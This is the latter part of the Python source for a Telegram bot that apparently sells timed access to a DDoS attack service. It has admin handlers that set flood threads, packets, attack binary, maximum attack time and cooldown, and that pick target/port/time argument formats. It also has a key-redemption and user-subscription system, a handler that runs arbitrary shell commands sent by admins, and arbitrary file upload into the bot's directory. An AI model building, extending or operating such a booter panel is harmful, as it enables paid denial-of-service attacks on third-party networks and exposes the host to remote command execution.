    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def execute_terminal_command(message):
    """Execute the terminal command entered by the admin."""
    try:
        command = message.text.strip()
        
        # Check if the command starts with any of the blocked prefixes
        if any(command.startswith(blocked_prefix) for blocked_prefix in blocked_prefixes):
            bot.reply_to(message, "❗️𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱.")
            return
        
        # Execute the command if it's not blocked
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if output:
            bot.reply_to(message, f"⏺️ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗢𝘂𝘁𝗽𝘂𝘁:\n`{output}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, "✅ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗲𝘅𝗲𝗰𝘂𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘂𝗹𝗹𝘆")
    except Exception as e:
        bot.reply_to(message, f"❗️ 𝗘𝗿𝗿𝗼𝗿 𝗘𝘅𝗲𝗰𝘂𝘁𝗶𝗻𝗴 𝗰𝗼𝗺𝗺𝗮𝗻𝗱: {str(e)}")

@bot.message_handler(func=lambda message: message.text == "Upload")
def upload_to_terminal(message):
    """Handle file upload to terminal for admins."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "📤 𝗦𝗲𝗻𝗱 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱 𝗶𝗻 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝗹.")
        bot.register_next_step_handler(message, process_file_upload)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_file_upload(message):
    """Process the uploaded file and save it in the current directory."""
    if message.document:
        try:
            # Get file info and download it
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Get the current directory of the Python script
            current_dir = os.path.dirname(os.path.abspath(__file__))
            
            # Create the full file path where the file will be saved
            file_path = os.path.join(current_dir, message.document.file_name)
            
            # Save the file in the current directory
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            bot.reply_to(message, f"📤 𝗙𝗶𝗹𝗲 𝘂𝗽𝗹𝗼𝗮𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆:\n `{file_path}`", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, f"❗️𝗘𝗿𝗿𝗼𝗿 𝘂𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲: {str(e)}")
    else:
        bot.reply_to(message, "❗️𝗦𝗲𝗻𝗱 𝗼𝗻𝗹𝘆 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱 ")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ ATTACK SETTINGS ]----------------------

@bot.message_handler(func=lambda message: message.text == "Threads")
def set_threads(message):
    """Admin command to change threads."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝘁𝗵𝗿𝗲𝗮𝗱𝘀:")
        bot.register_next_step_handler(message, process_new_threads)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_threads(message):
        new_threads = message.text.strip()
        global threads
        threads = new_threads
        save_config()  # Save changes
        bot.reply_to(message, f"✅ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_threads}")

@bot.message_handler(func=lambda message: message.text == "Binary")
def set_binary(message):
    """Admin command to change the binary name."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝗮𝗺𝗲 𝗼𝗳 𝘁𝗵𝗲 𝗻𝗲𝘄 𝗯𝗶𝗻𝗮𝗿𝘆:")
        bot.register_next_step_handler(message, process_new_binary)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_binary(message):
    new_binary = message.text.strip()
    global binary
    binary = new_binary
    save_config()  # Save changes
    bot.reply_to(message, f"✅ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: `{new_binary}`", parse_mode='Markdown')


@bot.message_handler(func=lambda message: message.text == "Packets")
def set_packets(message):
    """Admin command to change packets."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝗽𝗮𝗰𝗸𝗲𝘁𝘀:")
        bot.register_next_step_handler(message, process_new_packets)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_packets(message):
    new_packets = message.text.strip()
    global packets
    packets = new_packets
    save_config()  # Save changes
    bot.reply_to(message, f"✅ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_packets}")

@bot.message_handler(func=lambda message: message.text == "parameters")
def set_command_type(message):
    """Admin command to change the full_command_type using inline buttons."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("parameters 1", callback_data="arg_1")
        btn2 = types.InlineKeyboardButton("parameters 2", callback_data="arg_2")
        btn3 = types.InlineKeyboardButton("parameters 3", callback_data="arg_3")
        markup.add(btn1, btn2, btn3)
        
        bot.reply_to(message, "🔹 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 𝘁𝘆𝗽𝗲:", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("arg_"))
def process_parameters_selection(call):
    """Handles parameters selection via inline buttons."""
    global full_command_type
    selected_arg = int(call.data.split("_")[1])  # Extract parameters number

    # Update the global command type
    full_command_type = selected_arg
    save_config()  # Save the new configuration

    # Generate response message based on the selected parameters
    if full_command_type == 1:
        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 1:\n `<target> <port> <time>`"
    elif full_command_type == 2:
        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 2:\n `<target> <port> <time> <threads>`"
    elif full_command_type == 3:
        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 3:\n `<target> <port> <time> <packet> <threads>`"
    else:
        response_message = "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻."

    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response_message, parse_mode='Markdown')
        
@bot.message_handler(func=lambda message: message.text == "Attack Cooldown")
def set_attack_cooldown(message):
    """Admin command to change attack cooldown time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "🕒 𝗘𝗻𝘁𝗲𝗿 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀):")
        bot.register_next_step_handler(message, process_new_attack_cooldown)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_attack_cooldown(message):
    global ATTACK_COOLDOWN
    try:
        new_cooldown = int(message.text)
        ATTACK_COOLDOWN = new_cooldown
        save_config()  # Save changes
        bot.reply_to(message, f"✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
    except ValueError:
        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
        
@bot.message_handler(func=lambda message: message.text == "Attack Time")
def set_attack_time(message):
    """Admin command to change max attack time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "⏳ 𝗘𝗻𝘁𝗲𝗿 𝗺𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀):")
        bot.register_next_step_handler(message, process_new_attack_time)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_attack_time(message):
    global MAX_ATTACK_TIME
    try:
        new_attack_time = int(message.text)
        MAX_ATTACK_TIME = new_attack_time
        save_config()  # Save changes
        bot.reply_to(message, f"✅ 𝗠𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_attack_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
    except ValueError:
        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ KEY MANAGEMENT ]----------------------
        
@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_command(message):
    user_id = str(message.chat.id)
    
    # Check if user exists and if their access has expired
    if user_id in users:
        expiration_time = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            bot.reply_to(message, "❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕")
            return  # User still has access, so we stop here
            
    bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip().upper()

    if key in keys:
        duration_in_hours = keys[key]
        new_expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_in_hours)
        users[user_id] = new_expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()  # Save immediately

        del keys[key]
        save_keys()  # Save immediately

        bot.reply_to(message, f"✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝘂𝗻𝘁𝗶𝗹: {convert_utc_to_ist(users[user_id])}")
    else:
        bot.reply_to(message, "📛 𝗞𝗲𝘆 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗼𝗿 𝗶𝗻𝘃𝗮𝗹𝗶𝗱 📛")
        
# Step 1: Command to generate key
@bot.message_handler(func=lambda message: message.text in ["Generate Key"])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = InlineKeyboardMarkup(row_width=1)
        markup.row(
            InlineKeyboardButton("Days", callback_data="select_days"),
            InlineKeyboardButton("Hours", callback_data="select_hours")
        )
        sent_message = bot.send_message(message.chat.id, "*Select duration:*", reply_markup=markup, parse_mode="Markdown")
        
        # Store the message ID
        message_store[message.chat.id] = sent_message.message_id
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱", parse_mode="Markdown")

# Step 2: Handle selection (days or hours)
@bot.callback_query_handler(func=lambda call: call.data in ["select_days", "select_hours"])
def handle_duration_selection(call):
    user_id = str(call.message.chat.id)
    if user_id in admin_id:
        time_type = "days" if call.data == "select_days" else "hours"

        # Get the stored message ID
        edit_msg_id = message_store.get(call.message.chat.id)

        if edit_msg_id:
            # Edit the original message to update text and remove buttons
            bot.edit_message_text(f"✅ *Enter the number of {time_type}:*", 
                                  call.message.chat.id, edit_msg_id, parse_mode="Markdown")

        # Wait for admin input
        bot.register_next_step_handler(call.message, process_generate_key, time_type)
    else:
        bot.answer_callback_query(call.id, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")

# Step 3: Process key generation
def process_generate_key(message, time_type):
    user_id = str(message.chat.id)
    try:
        time_amount = int(message.text)
        if time_amount <= 0:
            raise ValueError("Invalid number")

        # Convert to hours if needed
        duration_in_hours = time_amount if time_type == "hours" else time_amount * 24
        key = generate_key()
        keys[key] = duration_in_hours
        save_keys()

        response = f"✅ 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! ✅\n\n🔑 *Key:* `{key}`\n⏳ *Validity:* {time_amount} {time_type}\n🔰 *Status:* Unused"
    except ValueError:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!"

    bot.send_message(message.chat.id, response, parse_mode="Markdown")

# ------------------------------------------------------------------
        

        
        
        
# --------------------[ ADMIN PANEL SETTINGS ]----------------------
      
@bot.message_handler(func=lambda message: message.text in ["Unused Keys"])
def handle_admin_actions(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.")
        return

    if not keys:
        bot.send_message(message.chat.id, "𝗡𝗼 𝘂𝗻𝘂𝘀𝗲𝗱 𝗸𝗲𝘆𝘀 𝗳𝗼𝘂𝗻𝗱")
        return

    key_list = "𝗨𝗻𝘂𝘀𝗲𝗱 𝗸𝗲𝘆𝘀:\n\n"
    for key, duration in keys.items():
        if duration >= 24:
            days = duration // 24  # Convert hours to days
            hours = duration % 24  # Remaining hours
            if hours > 0:
                key_list += f"𝗸𝗲𝘆: `{key}` \n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: `{days}` days, `{hours}` hours\n\n"
            else:
                key_list += f"𝗸𝗲𝘆: `{key}` \n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: `{days}` days\n\n"
        else:
            key_list += f"𝗸𝗲𝘆: `{key}` \n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: `{duration}` hours\n\n"

    bot.send_message(message.chat.id, key_list, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text in ["View Users"])
def handle_admin_actions(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.")
        return
        
    if not users:
        bot.send_message(message.chat.id, "𝗡𝗼 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱!")
        return

    user_list = "𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n\n"
    for user_id, expiry in users.items():
        user_list += f"𝗨𝘀𝗲𝗿 𝗜𝗗: `{user_id}` \n𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻 : `{convert_utc_to_ist(expiry)}`\n\n"
    
    bot.send_message(message.chat.id, user_list, parse_mode="Markdown")     
    
    
@bot.message_handler(func=lambda message: message.text in ["Remove User"])
def handle_admin_actions(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.", parse_mode="Markdown")
        return
        
    bot.send_message(message.chat.id, "🔴 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗨𝘀𝗲𝗿 𝗜𝗗 𝘁𝗼 𝗥𝗲𝗺𝗼𝘃𝗲:", parse_mode="Markdown")
    bot.register_next_step_handler(message, remove_user)
        
def remove_user(message):
    user_id = message.text.strip()
    if user_id in users:
        del users[user_id]
        save_users()
        bot.send_message(message.chat.id, f"✅ 𝗨𝘀𝗲𝗿 {user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "𝗨𝘀𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", parse_mode="Markdown")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ ADMIN PANEL SETTINGS ]------------------
        
@bot.message_handler(func=lambda message: message.text == "Add User")
def add_user_command(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
        
    bot.send_message(message.chat.id, "*Please enter the User ID:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, ask_duration_unit)

def ask_duration_unit(message):
    user_id = message.text.strip()
    
    # Store user ID temporarily
    bot_data[message.chat.id] = {"user_id": user_id}

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Days", callback_data="days"))
    markup.add(InlineKeyboardButton("Hours", callback_data="hours"))

    bot.send_message(message.chat.id, "⏳ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["days", "hours"])
def ask_duration(call):
    bot.answer_callback_query(call.id)

    chat_id = call.message.chat.id
    time_unit = "days" if call.data == "days" else "hours"

    # Store the selected time unit
    bot_data[chat_id]["time_unit"] = time_unit

    # Edit the message to ask for the number of days/hours
    bot.edit_message_text(
        chat_id=chat_id, 
        message_id=call.message.message_id, 
        text=f"*Enter the number of {time_unit}:*", parse_mode='Markdown'
    )

    bot.register_next_step_handler(call.message, add_user_access)

def add_user_access(message):
    chat_id = message.chat.id
    user_data = bot_data.get(chat_id, {})

    if "user_id" not in user_data or "time_unit" not in user_data:
        bot.send_message(chat_id, "⚠️ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝘀𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀..")
        return

    user_id = user_data["user_id"]
    time_unit = user_data["time_unit"]

    try:
        duration_value = int(message.text.strip())

        if time_unit == "days":
            duration_in_hours = duration_value * 24
        else:
            duration_in_hours = duration_value

        expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_in_hours)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()

        bot.send_message(chat_id, f"✅ 𝗨𝘀𝗲𝗿 *{user_id}* 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗼𝗿 *{duration_value}* *{time_unit}*!", parse_mode='Markdown')
    
    except ValueError:
        bot.send_message(chat_id, "❗ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!")
              
@bot.message_handler(func=lambda message: message.text == "Controll Access")
def show_modify_options(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return

    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("⬆️ Increase Access", callback_data="increase_access"),
        InlineKeyboardButton("⬇️ Decrease Access", callback_data="decrease_access")
    )
    
    bot.send_message(message.chat.id, "🔹 *Choose an action:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["increase_access", "decrease_access"])
def ask_user_id(call):
    bot.answer_callback_query(call.id)
    
    chat_id = call.message.chat.id
    action = "Increase" if call.data == "increase_access" else "Decrease"

    admin_sessions[chat_id] = {"action": call.data}  # Store action type

    # Edit message to remove buttons and update text
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"✅ *Selected: {action} Access*\n*Enter the User ID:*", parse_mode='Markdown'
    )

    bot.register_next_step_handler(call.message, ask_time_unit)
    
def ask_time_unit(message):
    chat_id = message.chat.id
    user_id = message.text.strip()

    # Validate if user exists
    if user_id not in users:
        bot.reply_to(message, f"❌ 𝗨𝘀𝗲𝗿 {user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗼𝗿 𝗵𝗮𝘀 𝗻𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀.")
        return

    admin_sessions[chat_id]["user_id"] = user_id

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("Days", callback_data="time_days"),
        InlineKeyboardButton("Hours", callback_data="time_hours")
    )

    bot.send_message(chat_id, "⏳ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["time_days", "time_hours"])
def ask_durations(call):
    bot.answer_callback_query(call.id)

    chat_id = call.message.chat.id
    time_unit = "days" if call.data == "time_days" else "hours"

    # Store the selected time unit
    admin_sessions[chat_id]["time_unit"] = time_unit

    # Edit the message to ask for the number of days/hours
    bot.edit_message_text(
        chat_id=chat_id, 
        message_id=call.message.message_id, 
        text=f"*Enter the number of {time_unit}:*", parse_mode='Markdown'
    )

    bot.register_next_step_handler(call.message, process_duration)

def process_duration(message):
    chat_id = message.chat.id
    session = admin_sessions.get(chat_id, {})

    if "user_id" not in session or "action" not in session or "time_unit" not in session:
        bot.send_message(chat_id, "⚠️ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝘀𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.")
        return

    user_id = session["user_id"]
    action = session["action"]
    time_unit = session["time_unit"]

    try:
        duration_value = int(message.text.strip())

        if time_unit == "days":
            duration_in_hours = duration_value * 24
        else:
            duration_in_hours = duration_value

        # Get current expiration time
        current_expiry = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')

        if action == "increase_access":
            new_expiry = current_expiry + datetime.timedelta(hours=duration_in_hours)
            change_type = "𝗲𝘅𝘁𝗲𝗻𝗱𝗲𝗱"
        else:  # Decrease case
            new_expiry = current_expiry - datetime.timedelta(hours=duration_in_hours)
            change_type = "𝗿𝗲𝗱𝘂𝗰𝗲𝗱"

        # Prevent negative expiration
        if new_expiry < datetime.datetime.now():
            bot.reply_to(message, f"⚠️ 𝗨𝘀𝗲𝗿 {user_id}'𝘀 𝗮𝗰𝗰𝗲𝘀𝘀 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝗿𝗲𝗱𝘂𝗰𝗲𝗱 𝗳𝘂𝗿𝘁𝗵𝗲𝗿!")
            return

        # Update user's expiration time
        users[user_id] = new_expiry.strftime('%Y-%m-%d %H:%M:%S')
        save_users()  # Save changes

        # Notify Admin
        bot.reply_to(message, f"✅ 𝗨𝘀𝗲𝗿 {user_id}'𝘀 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 {change_type} 𝗯𝘆 {duration_value} {time_unit}.\n"
                              f"📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {convert_utc_to_ist(users[user_id])}")

        # Notify User
        bot.send_message(user_id, f"🔔 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 {change_type} 𝗯𝘆 {duration_value} {time_unit}.\n"
                                  f"📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {convert_utc_to_ist(users[user_id])}")

    except ValueError:
        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!")

if __name__ == "__main__":
    while True:
        load_data()
        try:
            bot.polling(none_stop=True, interval=0.5)
        except Exception as e:
            print(e)
            time.sleep(1)
